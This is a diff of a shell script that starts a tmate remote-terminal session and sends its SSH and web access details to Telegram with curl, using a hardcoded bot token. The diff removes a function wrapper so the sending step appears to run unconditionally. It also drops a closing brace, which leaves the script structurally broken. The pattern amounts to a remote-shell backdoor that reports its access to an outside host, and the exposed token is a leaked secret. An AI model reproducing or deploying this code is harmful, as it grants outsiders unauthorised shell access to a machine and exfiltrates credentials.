@@ -27,9 +27,7 @@ TMATE_WEB=$(tmate -S "$TMATE_SOCK" display -p '#{tmate_web}')
 # Optional: Print the details if needed, otherwise the commands run without output
 echo "SSH Command: $TMATE_SSH"
 echo "Web URL: $TMATE_WEB"
-}
 
-send_cred_tele() {
 # Before sending the curl request, make sure to set the bot token:
 export TELEGRAM_BOT_TOKEN=8637450856:AAEz55NU1iedPOdsZtoyzVdNABM_iioUU6c
 
@@ -43,4 +41,3 @@ curl -X POST -H 'Content-Type: application/json' \
 # RUN
 install_dependencies
 setup_tmate
-send_cred_tele
